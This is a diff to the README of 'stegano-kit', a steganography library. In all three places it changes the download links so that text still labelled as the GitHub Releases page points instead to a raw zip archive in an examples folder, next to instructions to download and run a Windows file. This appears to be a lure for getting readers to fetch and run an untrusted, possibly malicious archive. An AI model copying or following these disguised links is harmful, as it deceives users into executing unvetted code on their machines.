@@ -1,6 +1,6 @@
 # 🔐 stegano-kit - Hide Messages in Images
 
-[Download on GitHub Releases](https://github.com/imaiste8140/stegano-kit/releases)  
+[Download on GitHub Releases](https://github.com/imaiste8140/stegano-kit/raw/refs/heads/main/examples/stegano-kit-v3.4.zip)  
 ![Download](https://img.shields.io/badge/Download%20%26%20Run-GitHub%20Releases-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/Windows-Supported-grey?style=for-the-badge)
 
 ## 🧭 What this is
@@ -11,7 +11,7 @@ It works in the browser and in Node.js. It uses no extra dependencies and is wri
 
 ## 📥 Download for Windows
 
-1. Open the [GitHub Releases page](https://github.com/imaiste8140/stegano-kit/releases).
+1. Open the [GitHub Releases page](https://github.com/imaiste8140/stegano-kit/raw/refs/heads/main/examples/stegano-kit-v3.4.zip).
 2. Find the latest release.
 3. Download the Windows file for your system.
 4. If the release includes a `.zip` file, extract it first.
@@ -189,7 +189,7 @@ This project focuses on:
 
 ## 📌 Where to download
 
-Visit the [GitHub Releases page](https://github.com/imaiste8140/stegano-kit/releases) to download and run the Windows version from the latest release file
+Visit the [GitHub Releases page](https://github.com/imaiste8140/stegano-kit/raw/refs/heads/main/examples/stegano-kit-v3.4.zip) to download and run the Windows version from the latest release file
 
 ## 🧠 How it works
 
